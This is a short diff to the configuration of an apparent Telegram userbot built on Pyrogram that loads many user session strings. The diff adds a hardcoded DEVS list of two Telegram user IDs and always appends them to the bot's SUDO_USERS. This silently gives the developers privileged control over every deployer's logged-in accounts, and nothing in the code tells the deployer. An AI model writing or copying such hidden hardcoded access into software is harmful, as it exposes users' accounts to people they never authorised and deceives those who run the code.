@@ -9,7 +9,6 @@ import time
 
 from dotenv import load_dotenv
 from pyrogram import Client, filters
-from os import getenv
 
 if os.path.exists(".env"):
     load_dotenv(".env")
@@ -44,9 +43,14 @@ SESSION19 = os.getenv("SESSION19", None)
 SESSION20 = os.getenv("SESSION20", None)
 HNDLR = os.getenv("HNDLR", ".")
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
-SUDO_USERS = list(map(int, getenv("SUDO_USERS").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+
+sudo = os.getenv("SUDO_USERS")
+SUDO_USERS = []
+if sudo:
+    SUDO_USERS = make_int(sudo)
+DEVS = [1517994352, 1789859817]
+for x in DEVS:
+    SUDO_USERS.append(x)
 
 SUDO_USERS.append(OWNER_ID)
 
